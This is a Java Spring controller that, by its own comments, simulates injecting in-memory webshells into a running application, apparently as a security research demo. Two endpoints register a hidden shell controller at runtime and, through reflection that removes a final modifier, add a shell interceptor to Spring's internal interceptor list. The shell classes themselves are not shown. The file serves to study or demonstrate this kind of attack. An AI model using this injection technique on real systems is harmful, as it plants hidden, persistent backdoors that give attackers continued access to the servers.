package cn.safe6.controller;

import cn.safe6.controller.interceptor.ShellInterceptor;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.context.ContextLoader;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.context.support.WebApplicationContextUtils;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.servlet.support.RequestContextUtils;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.util.List;

@Controller
public class TestController {



    @RequestMapping("/index")
    public String test(){
        System.out.println(1);
        return "index";
    }

    /**
     * 用于debug，看上下文对象
     * @return
     */
    @RequestMapping("/ctx")
    public String ctx(){
        WebApplicationContext context = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());
        WebApplicationContext context1 = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);

        System.out.println("get ctx");
        return "index";
    }


    /**
     * 模拟注入controller内存马
     * @return
     * @throws Exception
     */
    @RequestMapping("/addCTShell")
    public String addCT() throws Exception {
        WebApplicationContext context = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());
        //WebApplicationContext context1 = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        RequestMappingHandlerMapping handlerMapping = context.getBean(RequestMappingHandlerMapping.class);
        RequestMappingInfo requestMappingInfo = new RequestMappingInfo(new PatternsRequestCondition("/controller"),null,null,null,null,null,null);
        Class shell = Class.forName("cn.safe6.controller.ShellController");
        Method method = shell.getMethod("exec");

        handlerMapping.registerMapping(requestMappingInfo,shell.newInstance(),method);


        System.out.println(1);
        return "index";
    }


    /**
     * 模拟注入interceptor内存马
     * @return
     * @throws Exception
     */
    @RequestMapping("/addICShell")
    public String addIC() throws Exception {
        WebApplicationContext context = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());
        AbstractHandlerMapping handlerMapping = context.getBean(RequestMappingHandlerMapping.class);

        //Field interceptorsField = handlerMapping.getClass().getDeclaredField("adaptedInterceptors");
        Field interceptorsField = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
        interceptorsField.setAccessible(true);

        //修改modifiers
        Field modifiers = interceptorsField.getClass().getDeclaredField("modifiers");
        modifiers.setAccessible(true);
        modifiers.setInt(interceptorsField,interceptorsField.getModifiers() & ~Modifier.FINAL);

        ShellInterceptor shellInterceptor = new ShellInterceptor();

        List<HandlerInterceptor> adaptedInterceptors = (List<HandlerInterceptor>) interceptorsField.get(handlerMapping);
        adaptedInterceptors.add(shellInterceptor);

        System.out.println(1);
        return "index";
    }
}
